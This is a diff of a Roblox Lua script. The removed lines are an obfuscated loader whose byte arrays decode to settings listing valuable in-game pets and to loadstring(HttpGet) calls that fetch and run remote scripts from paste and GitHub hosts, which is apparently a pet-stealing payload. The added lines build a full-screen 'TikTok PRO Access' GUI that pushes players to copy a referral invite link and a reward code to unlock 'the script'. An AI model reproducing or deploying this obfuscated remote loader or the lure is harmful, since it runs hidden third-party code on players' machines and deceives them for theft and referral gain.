@@ -1,77 +1,509 @@
---[[ protected | agonix ]]
-local uX6dupqR=42
-local ri3r4JbR={}
-for _,b in ipairs({150,153,141,139,150,74,145,143,152,160,74,103,74,145,143,158,145,143,152,160,82,83,52,52,145,143,152,160,88,118,121,113,113,111,124,137,117,111,131,74}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({103,74,76,97,129,109,114,129,123,119,126,92,131,117,109,108,116,76,52,52,145,143,152,160,88,126,107,124,113,111,126,137,127,125,111,124,137,115,110,74}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({103,74,92,98,92,99,91,92,91,91,96,91,52,52,145,143,152,160,88,113,121,121,110,137,107,128,107,126,107,124,74,103,74,76,146,158,158,154,157,100}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({89,89,141,142,152,88,154,144,154,157,88,145,145,89,154,144,154,157,89,97,97,96,90,92,87,140,150,153,153,142,87,141,139,158,88,145,147,144,76,52}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({52,145,143,152,160,88,107,118,118,121,129,111,110,137,107,120,115,119,107,118,125,74,103,74,165,52,74,74,74,74,76,125,158,156,139,161,140,143,156,156}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({163,74,111,150,143,154,146,139,152,158,76,86,52,74,74,74,74,76,114,143,139,142,150,143,157,157,74,114,153,156,157,143,151,139,152,76,86,52,74,74}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({74,74,76,119,143,153,161,150,76,86,52,74,74,74,74,76,116,153,146,152,74,122,153,156,149,76,86,52,74,74,74,74,76,125,149,147,140,147,142,147}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({74,126,153,147,150,143,158,76,86,52,74,74,74,74,76,118,153,157,74,110,156,139,145,153,152,157,76,86,52,74,74,74,74,76,122,146,153,143,152,147}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({162,76,86,52,74,74,74,74,76,113,156,147,144,144,147,152,76,86,52,74,74,74,74,76,110,156,139,145,153,152,74,107,155,159,139,152,147,152,147,76}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({86,52,74,74,74,74,76,110,156,139,145,153,152,74,113,147,152,145,143,156,147,152,147,76,86,52,74,74,74,74,76,110,156,139,145,153,152,74,125,149}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({143,150,143,158,153,152,147,152,147,76,86,52,74,74,74,74,76,122,150,139,152,158,74,108,156,153,157,76,86,52,74,74,74,74,76,125,147,145,152,153}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({156,143,74,109,139,156,139,154,139,141,143,76,86,52,74,74,74,74,76,107,156,141,139,74,108,156,153,157,76,86,52,74,74,74,74,76,110,156,139,145}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({153,152,74,109,139,152,152,143,150,150,153,152,147,76,86,52,74,74,74,74,76,118,153,160,143,74,118,153,160,143,74,108,143,139,156,76,86,52,74,74}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({74,74,76,119,153,140,163,74,108,156,153,157,76,86,52,74,74,74,74,76,114,163,142,156,139,74,125,143,156,154,143,152,158,76,86,52,74,74,74,74}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({76,107,156,141,139,142,156,139,145,153,152,76,86,52,74,74,74,74,76,110,147,145,147,74,120,139,156,161,146,139,150,76,86,52,74,74,74,74,76,117}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({156,139,149,143,152,76,86,52,74,74,74,74,76,118,139,74,125,159,154,156,143,151,143,74,109,153,151,140,147,152,139,157,147,153,152,76,86,52,74,74}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({74,74,76,111,150,143,144,139,152,158,153,74,112,156,147,145,153,76,86,52,74,74,74,74,76,114,163,142,156,139,74,108,159,152,152,163,76,86,52,74}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({74,74,74,76,119,143,142,159,157,147,152,147,74,139,152,142,74,110,143,151,153,152,147,152,147,76,86,52,74,74,74,74,76,109,143,150,143,157,158,147}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({139,150,74,122,143,145,139,157,159,157,76,86,52,74,74,74,74,76,109,143,156,140,143,156,159,157,76,86,52,74,74,74,74,76,116,143,150,150,163,74}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({119,153,140,163,76,86,52,74,74,74,74,76,128,143,152,159,157,154,147,152,153,76,86,52,74,74,74,74,76,108,159,151,140,139,158,156,153,152,76,86}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({52,74,74,74,74,76,108,159,152,152,163,74,139,152,142,74,111,145,145,163,76,86,52,74,74,74,74,76,122,153,154,141,159,156,159,74,139,152,142,74}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({112,147,164,164,159,156,159,76,86,52,74,74,74,74,76,118,139,74,108,156,143,139,149,144,139,157,158,74,109,153,151,140,147,152,139,157,147,153,152,76}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({86,52,74,74,74,74,76,124,153,157,143,163,74,139,152,142,74,126,143,142,142,163,76,86,52,74,74,74,74,76,109,139,154,147,158,139,152,153,74,119}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({153,140,163,76,86,52,74,74,74,74,76,109,153,150,139,74,109,139,158,76,86,52,74,74,74,74,76,109,153,153,149,147,74,139,152,142,74,119,147,150}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({149,147,76,86,52,74,74,74,74,76,121,156,141,146,147,142,153,162,76,86,52,74,74,74,74,76,125,149,143,150,150,163,74,139,152,142,74,109,153,144}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({144,163,76,86,52,74,74,74,74,76,108,159,156,145,159,156,153,74,107,152,142,74,112,156,163,159,156,153,76,86,52,74,74,74,74,76,118,153,157,74}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({125,143,141,156,143,158,74,109,153,151,140,147,152,139,157,147,153,152,139,157,76,86,52,74,74,74,74,76,117,143,158,159,154,139,158,74,108,156,153,157}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({76,86,52,74,74,74,74,76,124,143,147,152,147,158,153,74,125,150,143,147,145,146,147,158,153,76,86,52,74,74,74,74,76,112,153,156,158,159,152,159}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({74,139,152,142,74,109,139,157,146,159,156,159,76,86,52,74,74,74,74,76,118,153,157,74,107,151,147,145,153,157,76,86,52,74,74,74,74,76,122,147}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({164,164,139,74,139,152,142,74,124,139,152,141,146,76,86,52,74,74,74,74,76,122,139,152,141,139,149,143,74,139,152,142,74,125,163,156,159,154,76,86}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({52,74,74,74,74,76,110,156,139,141,159,150,147,152,153,76,86,52,74,74,74,74,76,112,147,157,146,147,152,153,74,109,150,153,161,152,147,152,153,76}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({86,52,74,74,74,74,76,112,153,162,147,152,147,74,118,139,152,158,143,156,152,147,152,147,76,86,52,74,74,74,74,76,117,139,150,147,149,139,74,108}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({156,153,157,76,86,52,74,74,74,74,76,118,153,157,74,125,143,149,153,150,139,146,157,76,86,52,74,74,74,74,76,125,139,151,151,163,152,147,74,126}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({156,159,141,149,147,152,147,76,86,52,74,74,74,74,76,109,139,157,146,74,153,156,74,109,139,156,142,76,86,52,74,74,74,74,76,112,156,139,145,156}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({139,151,139,74,139,152,142,74,109,146,153,141,156,139,151,139,76,86,52,74,74,74,74,76,118,139,74,109,139,157,139,74,108,153,153,76,86,52,74,74}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({74,74,76,118,139,74,112,159,157,143,74,119,139,141,146,147,152,143,76,86,52,74,74,74,74,76,118,153,157,74,107,142,151,147,152,157,76,86,52,74}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({74,74,74,76,112,150,163,147,152,145,74,110,159,158,141,146,151,139,152,76,86,52,74,74,74,74,76,110,159,145,145,163,74,108,156,153,157,76,86,52}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({74,74,74,74,76,118,139,74,112,153,153,142,74,109,153,151,140,147,152,139,157,147,153,152,76,86,52,74,74,74,74,76,131,143,158,147,151,139,158,147}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({141,76,86,52,74,74,74,74,76,113,153,150,142,74,139,152,142,74,110,147,139,151,153,152,142,76,86,52,74,74,74,74,76,125,81,151,153,156,143,74}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({125,143,156,139,158,76,86,52,74,74,74,74,76,125,139,151,151,163,152,147,74,109,139,149,147,152,147,76,86,52,74,74,74,74,76,108,153,154,154,147}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({152,74,108,159,152,152,163,76,86,52,74,74,74,74,76,125,139,151,151,163,152,147,74,125,154,153,153,149,163,152,147,76,86,52,74,74,74,74,76,125}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({154,153,153,149,163,74,139,152,142,74,122,159,151,154,149,163,76,86,52,74,74,74,74,76,113,147,152,145,143,156,74,113,143,156,139,158,76,86,52,74}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({74,74,74,76,118,139,74,109,156,139,144,158,74,119,139,141,146,147,152,143,76,86,52,74,74,74,74,76,118,153,157,74,109,146,147,150,150,147,157,76}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({86,52,74,74,74,74,76,118,153,157,74,114,139,141,149,143,156,157,76,86,52,74,74,74,74,76,108,143,139,156,147,158,153,74,109,139,140,147,152,147}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({158,153,76,86,52,74,74,74,74,76,109,139,154,147,158,139,152,153,74,107,151,143,156,147,141,139,152,153,76,86,52,74,74,74,74,76,124,159,140,147}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({149,153,74,139,152,142,74,117,159,140,147,149,153,76,86,52,74,74,74,74,76,111,162,139,151,143,152,74,108,156,153,157,76,86,52,74,74,74,74,76}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({124,159,140,156,147,149,147,149,153,76,86,52,74,74,74,74,76,125,139,151,151,163,152,147,74,112,139,158,158,147,152,147,76,86,52,74,74,74,74,76}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({113,159,143,157,158,74,96,96,96,76,86,52,74,74,74,74,76,113,156,139,140,139,158,156,153,152,76,86,52,74,74,74,74,76,122,153,154,74,122,153}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({154,74,122,143,158,139,150,147,152,147,76,86,52,74,74,74,74,76,109,150,153,160,143,156,139,158,74,109,150,139,154,139,158,76,86,52,74,74,74,74}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({76,114,153,154,147,150,147,149,139,150,147,149,139,74,114,153,154,147,150,147,149,139,150,139,149,153,76,86,52,74,74,74,74,76,122,153,150,139,156,153}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({147,142,147,152,147,76,86,52,74,74,74,74,76,122,156,143,158,164,153,74,124,153,140,153,76,86,52,74,74,74,74,76,113,139,156,139,151,139,74,139}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({152,142,74,119,139,142,159,152,142,159,152,145,76,86,52,74,74,74,74,76,123,159,139,141,149,147,152,147,74,125,152,139,141,149,147,152,147,76,86,52}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({74,74,74,74,76,112,143,157,158,147,160,143,74,96,97,76,86,52,74,74,74,74,76,107,152,158,153,152,147,153,76,86,52,74,74,74,74,76,116,153}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({150,150,163,74,116,153,150,150,163,74,125,139,146,159,156,76,86,52,74,74,74,74,76,126,147,156,147,150,147,149,139,150,147,149,139,74,126,147,156,147}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({150,147,149,139,150,139,149,153,76,86,52,74,74,74,74,76,124,147,141,153,74,110,147,152,143,156,153,76,86,52,74,74,74,74,76,110,159,145,74,110}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({159,145,74,110,159,145,76,86,52,74,74,74,74,76,112,156,139,145,153,150,139,74,118,139,74,118,139,74,118,139,76,86,52,74,74,74,74,76,113,150}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({153,140,139,74,125,158,143,154,154,139,76,86,52,74,74,74,74,76,114,163,142,156,139,74,110,156,139,145,153,152,74,109,139,152,152,143,150,150,153,152}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({147,76,52,167,52,52,145,143,152,160,88,107,118,118,121,129,111,110,137,108,107,125,111,125,117,115,120,125,74,103,74,165,52,74,74,74,74,133,76,126}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({156,139,150,139,150,139,76,135,74,103,74,158,156,159,143,52,167,52,52,145,143,152,160,88,107,118,118,121,129,111,110,137,113,111,107,124,125,74,103,74}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({165,52,74,74,74,74,133,76,109,139,152,142,163,74,125,143,152,158,156,163,76,135,74,103,74,158,156,159,143,52,167,52,52,145,143,152,160,88,107,118}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({118,121,129,111,110,137,122,118,107,109,111,137,115,110,125,74,103,74,165,52,74,74,74,74,91,90,99,99,98,93,96,96,98,90,97,99,92,93,97,52}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({167,52,52,87,87,74,111,162,158,156,139,74,157,141,156,147,154,158,157,74,82,151,153,160,143,142,74,153,159,158,74,153,144,74,151,139,147,152,83,52}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({145,143,152,160,88,111,130,126,124,107,137,118,121,107,110,125,126,124,115,120,113,125,74,103,74,165,52,74,74,74,74,76,146,158,158,154,157,100,89,89}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({154,139,157,158,143,144,163,88,139,154,154,89,112,156,140,143,109,141,162,146,89,156,139,161,76,86,52,167,52,52,87,87,74,121,154,158,147,153,152,139}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({150,74,113,127,115,74,89,74,153,158,146,143,156,74,150,153,139,142,143,156,157,52,158,139,157,149,88,157,154,139,161,152,82,144,159,152,141,158,147,153}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({152,82,83,52,74,74,74,74,150,153,139,142,157,158,156,147,152,145,82,145,139,151,143,100,114,158,158,154,113,143,158,82,76,146,158,158,154,157,100,89}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({89,154,139,157,158,143,144,163,88,139,154,154,89,127,163,110,144,97,108,128,99,89,156,139,161,76,83,83,82,83,52,143,152,142,83,52,52,158,139,157}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({149,88,157,154,139,161,152,82,144,159,152,141,158,147,153,152,82,83,52,74,74,74,74,150,153,139,142,157,158,156,147,152,145,82,145,139,151,143,100,114}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({158,158,154,113,143,158,82,76,146,158,158,154,157,100,89,89,156,139,161,88,145,147,158,146,159,140,159,157,143,156,141,153,152,158,143,152,158,88,141,153}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({151,89,152,153,156,145,143,145,139,158,87,140,163,158,143,89,117,92,89,156,143,144,157,89,146,143,139,142,157,89,151,139,147,152,89,151,139,147,152,88}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-for _,b in ipairs({150,159,139,76,83,83,82,83,52,143,152,142,83}) do ri3r4JbR[#ri3r4JbR+1]=string.char((b-uX6dupqR)%256) end
-local aei4eHEv=table.concat(ri3r4JbR)
-local pjFk1reK=loadstring or load
-return pjFk1reK(aei4eHEv)()
+--[[
+  Premium TikTok PRO Access GUI — phone fit (everything on one screen)
+]]
+
+repeat task.wait() until game:IsLoaded()
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+local LP = Players.LocalPlayer
+local pg = LP:WaitForChild("PlayerGui")
+
+pcall(function()
+	local o = pg:FindFirstChild("TikTokPRO_AccessGUI")
+	if o then o:Destroy() end
+end)
+
+local INVITE_URL = "https://pro.tiktok.com/t/ZT9fWDQGh6U5x-VK4qJ/"
+local REWARD_CODE = "406535569"
+
+local function rgb(r,g,b) return Color3.fromRGB(r,g,b) end
+local C = {
+	bg0 = rgb(4, 6, 12),
+	bg1 = rgb(8, 12, 22),
+	card = rgb(14, 20, 36),
+	card2 = rgb(18, 26, 44),
+	border = rgb(40, 90, 140),
+	cyan = rgb(0, 210, 255),
+	cyan2 = rgb(80, 230, 255),
+	blue = rgb(40, 120, 255),
+	text = rgb(235, 245, 255),
+	muted = rgb(140, 165, 195),
+	green = rgb(60, 230, 150),
+	dim = rgb(20, 28, 48),
+}
+
+local function corner(p, r)
+	local c = Instance.new("UICorner")
+	c.CornerRadius = UDim.new(0, r or 10)
+	c.Parent = p
+	return c
+end
+local function stroke(p, col, th, tr)
+	local s = Instance.new("UIStroke")
+	s.Color = col or C.border
+	s.Thickness = th or 1
+	s.Transparency = tr or 0.35
+	s.Parent = p
+	return s
+end
+local function tween(obj, t, props, style)
+	local tw = TweenService:Create(obj, TweenInfo.new(t, style or Enum.EasingStyle.Quart, Enum.EasingDirection.Out), props)
+	tw:Play()
+	return tw
+end
+local function copyText(str)
+	local ok = false
+	pcall(function() if setclipboard then setclipboard(str) ok = true end end)
+	if not ok then pcall(function() if toclipboard then toclipboard(str) ok = true end end) end
+	if not ok then pcall(function() if writeclipboard then writeclipboard(str) ok = true end end) end
+	return ok
+end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "TikTokPRO_AccessGUI"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.DisplayOrder = 1000
+gui.Parent = pg
+
+-- fullscreen bg
+local backdrop = Instance.new("Frame")
+backdrop.Size = UDim2.fromScale(1, 1)
+backdrop.BackgroundColor3 = C.bg0
+backdrop.BorderSizePixel = 0
+backdrop.Parent = gui
+local bgG = Instance.new("UIGradient")
+bgG.Rotation = 130
+bgG.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, rgb(4, 8, 18)),
+	ColorSequenceKeypoint.new(1, rgb(2, 6, 14)),
+})
+bgG.Parent = backdrop
+
+-- light particles
+local ph = Instance.new("Frame")
+ph.BackgroundTransparency = 1
+ph.Size = UDim2.fromScale(1, 1)
+ph.ClipsDescendants = true
+ph.Parent = backdrop
+local particles = {}
+for i = 1, 12 do
+	local p = Instance.new("Frame")
+	local s = math.random(2, 4)
+	p.Size = UDim2.fromOffset(s, s)
+	p.Position = UDim2.fromScale(math.random(), math.random())
+	p.BackgroundColor3 = C.cyan
+	p.BackgroundTransparency = 0.5
+	p.BorderSizePixel = 0
+	p.Parent = ph
+	corner(p, 4)
+	particles[i] = { inst = p, speed = 0.01 + math.random() * 0.02, phase = math.random() * 6 }
+end
+RunService.RenderStepped:Connect(function(dt)
+	if not ph.Parent then return end
+	for _, p in ipairs(particles) do
+		local y = p.inst.Position.Y.Scale - p.speed * dt
+		if y < -0.02 then y = 1.02 end
+		p.inst.Position = UDim2.fromScale(p.inst.Position.X.Scale, y)
+	end
+end)
+
+-- ========== MAIN SHELL (scale-based, full safe area) ==========
+local shell = Instance.new("Frame")
+shell.Name = "Shell"
+shell.AnchorPoint = Vector2.new(0.5, 0.5)
+shell.Position = UDim2.fromScale(0.5, 0.5)
+shell.Size = UDim2.fromScale(0.96, 0.92) -- almost full screen
+shell.BackgroundColor3 = C.bg1
+shell.BorderSizePixel = 0
+shell.ClipsDescendants = true
+shell.ZIndex = 10
+shell.Parent = backdrop
+corner(shell, 14)
+local shellStroke = stroke(shell, C.cyan, 1.2, 0.4)
+
+-- max size constraint so it doesn't look huge on tablets
+local sizeConst = Instance.new("UISizeConstraint")
+sizeConst.MaxSize = Vector2.new(520, 720)
+sizeConst.Parent = shell
+
+-- layout: top header / middle flex / bottom nav — all scale
+local header = Instance.new("Frame")
+header.BackgroundTransparency = 1
+header.Size = UDim2.new(1, 0, 0.16, 0)
+header.Position = UDim2.fromScale(0, 0)
+header.ZIndex = 12
+header.Parent = shell
+
+local badge = Instance.new("TextLabel")
+badge.AnchorPoint = Vector2.new(0.5, 0)
+badge.Position = UDim2.new(0.5, 0, 0, 8)
+badge.Size = UDim2.new(0.55, 0, 0, 22)
+badge.BackgroundColor3 = C.card2
+badge.Font = Enum.Font.GothamBold
+badge.TextSize = 10
+badge.Text = "ACCESS VERIFICATION"
+badge.TextColor3 = C.cyan2
+badge.ZIndex = 13
+badge.Parent = header
+corner(badge, 11)
+stroke(badge, C.cyan, 1, 0.45)
+
+local title = Instance.new("TextLabel")
+title.BackgroundTransparency = 1
+title.Position = UDim2.new(0.04, 0, 0, 34)
+title.Size = UDim2.new(0.92, 0, 0, 40)
+title.Font = Enum.Font.GothamBlack
+title.TextSize = 15
+title.TextWrapped = true
+title.Text = "DO THE TIKTOK PRO LINK BELOW FOR SCRIPT"
+title.TextColor3 = C.text
+title.ZIndex = 13
+title.Parent = header
+
+local subtitle = Instance.new("TextLabel")
+subtitle.BackgroundTransparency = 1
+subtitle.Position = UDim2.new(0.06, 0, 1, -22)
+subtitle.Size = UDim2.new(0.88, 0, 0, 18)
+subtitle.Font = Enum.Font.Gotham
+subtitle.TextSize = 10
+subtitle.Text = "Complete the steps below to unlock access."
+subtitle.TextColor3 = C.muted
+subtitle.ZIndex = 13
+subtitle.Parent = header
+
+-- LINK CARD
+local linkCard = Instance.new("Frame")
+linkCard.Position = UDim2.new(0.04, 0, 0.17, 0)
+linkCard.Size = UDim2.new(0.92, 0, 0.2, 0)
+linkCard.BackgroundColor3 = C.card
+linkCard.BorderSizePixel = 0
+linkCard.ZIndex = 12
+linkCard.Parent = shell
+corner(linkCard, 12)
+local linkStroke = stroke(linkCard, C.cyan, 1.4, 0.28)
+
+local linkLabel = Instance.new("TextLabel")
+linkLabel.BackgroundTransparency = 1
+linkLabel.Position = UDim2.new(0.04, 0, 0.06, 0)
+linkLabel.Size = UDim2.new(0.92, 0, 0.18, 0)
+linkLabel.Font = Enum.Font.GothamBold
+linkLabel.TextSize = 10
+linkLabel.TextXAlignment = Enum.TextXAlignment.Left
+linkLabel.Text = "TIKTOK PRO INVITE LINK"
+linkLabel.TextColor3 = C.cyan2
+linkLabel.ZIndex = 13
+linkLabel.Parent = linkCard
+
+local linkBox = Instance.new("TextButton")
+linkBox.Position = UDim2.new(0.04, 0, 0.28, 0)
+linkBox.Size = UDim2.new(0.92, 0, 0.28, 0)
+linkBox.BackgroundColor3 = C.dim
+linkBox.AutoButtonColor = false
+linkBox.Font = Enum.Font.Gotham
+linkBox.TextSize = 9
+linkBox.Text = INVITE_URL
+linkBox.TextColor3 = C.text
+linkBox.TextTruncate = Enum.TextTruncate.AtEnd
+linkBox.ZIndex = 13
+linkBox.Parent = linkCard
+corner(linkBox, 8)
+
+local copyLinkBtn = Instance.new("TextButton")
+copyLinkBtn.Position = UDim2.new(0.04, 0, 0.62, 0)
+copyLinkBtn.Size = UDim2.new(0.92, 0, 0.3, 0)
+copyLinkBtn.BackgroundColor3 = C.blue
+copyLinkBtn.AutoButtonColor = false
+copyLinkBtn.Font = Enum.Font.GothamBold
+copyLinkBtn.TextSize = 12
+copyLinkBtn.Text = "CLICK TO COPY"
+copyLinkBtn.TextColor3 = C.text
+copyLinkBtn.ZIndex = 13
+copyLinkBtn.Parent = linkCard
+corner(copyLinkBtn, 8)
+do
+	local g = Instance.new("UIGradient")
+	g.Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0, rgb(0, 170, 255)),
+		ColorSequenceKeypoint.new(1, rgb(40, 100, 255)),
+	})
+	g.Parent = copyLinkBtn
+end
+
+-- TUTORIAL (compact)
+local tut = Instance.new("Frame")
+tut.Position = UDim2.new(0.04, 0, 0.39, 0)
+tut.Size = UDim2.new(0.92, 0, 0.34, 0)
+tut.BackgroundColor3 = C.card
+tut.BorderSizePixel = 0
+tut.ZIndex = 12
+tut.Parent = shell
+corner(tut, 12)
+stroke(tut, C.border, 1, 0.45)
+
+local stepBadge = Instance.new("TextLabel")
+stepBadge.BackgroundTransparency = 1
+stepBadge.Position = UDim2.new(0.05, 0, 0.06, 0)
+stepBadge.Size = UDim2.new(0.6, 0, 0.14, 0)
+stepBadge.Font = Enum.Font.GothamBold
+stepBadge.TextSize = 10
+stepBadge.TextXAlignment = Enum.TextXAlignment.Left
+stepBadge.Text = "STEP 01 / 04"
+stepBadge.TextColor3 = C.cyan
+stepBadge.ZIndex = 13
+stepBadge.Parent = tut
+
+local successIcon = Instance.new("TextLabel")
+successIcon.BackgroundTransparency = 1
+successIcon.Position = UDim2.new(0.85, 0, 0.05, 0)
+successIcon.Size = UDim2.new(0.12, 0, 0.16, 0)
+successIcon.Font = Enum.Font.GothamBlack
+successIcon.TextSize = 18
+successIcon.Text = "✓"
+successIcon.TextColor3 = C.green
+successIcon.Visible = false
+successIcon.ZIndex = 13
+successIcon.Parent = tut
+
+local stepTitle = Instance.new("TextLabel")
+stepTitle.BackgroundTransparency = 1
+stepTitle.Position = UDim2.new(0.05, 0, 0.22, 0)
+stepTitle.Size = UDim2.new(0.9, 0, 0.16, 0)
+stepTitle.Font = Enum.Font.GothamBlack
+stepTitle.TextSize = 13
+stepTitle.TextXAlignment = Enum.TextXAlignment.Left
+stepTitle.Text = "OPEN THE INVITE LINK"
+stepTitle.TextColor3 = C.text
+stepTitle.ZIndex = 13
+stepTitle.Parent = tut
+
+local stepBody = Instance.new("TextLabel")
+stepBody.BackgroundTransparency = 1
+stepBody.Position = UDim2.new(0.05, 0, 0.4, 0)
+stepBody.Size = UDim2.new(0.9, 0, 0.28, 0)
+stepBody.Font = Enum.Font.Gotham
+stepBody.TextSize = 11
+stepBody.TextWrapped = true
+stepBody.TextXAlignment = Enum.TextXAlignment.Left
+stepBody.TextYAlignment = Enum.TextYAlignment.Top
+stepBody.Text = "Click the TikTok PRO invite link above."
+stepBody.TextColor3 = C.muted
+stepBody.ZIndex = 13
+stepBody.Parent = tut
+
+local codeRow = Instance.new("Frame")
+codeRow.BackgroundTransparency = 1
+codeRow.Position = UDim2.new(0.05, 0, 0.7, 0)
+codeRow.Size = UDim2.new(0.9, 0, 0.26, 0)
+codeRow.Visible = false
+codeRow.ZIndex = 13
+codeRow.Parent = tut
+
